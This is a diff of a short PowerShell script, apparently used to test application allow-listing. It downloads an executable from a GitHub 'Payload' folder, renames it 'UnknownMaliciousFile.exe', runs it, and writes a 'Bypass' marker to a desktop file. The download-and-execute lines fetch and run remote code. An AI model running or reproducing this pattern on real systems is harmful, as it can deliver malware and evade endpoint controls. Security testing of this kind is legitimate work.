@@ -1,4 +1,4 @@
-$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/159d55a9e2eb957ce2326f4f46ceb54b72aeef5251299f0029ee5ac05366aad3.exe'
+$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/ReceiptAutoClose.exe'
 $output = "UnknownMaliciousFile.exe"
 $start_time = Get-Date
 
@@ -10,4 +10,4 @@ Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
 Start-Process -FilePath "UnknownMaliciousFile.exe"
 
-$DesktopPath = [Environment]::GetFolderPath('Desktop');echo Csharp4InstallUntilBypass >> $DesktopPath\\WLtester.txt;
+$DesktopPath = [Environment]::GetFolderPath('Desktop');echo 'Csharp4InstallUntilScriptBypass.' >> $DesktopPath\\WLtester.txt;echo '' >> $DesktopPath\\WLtester.txt;
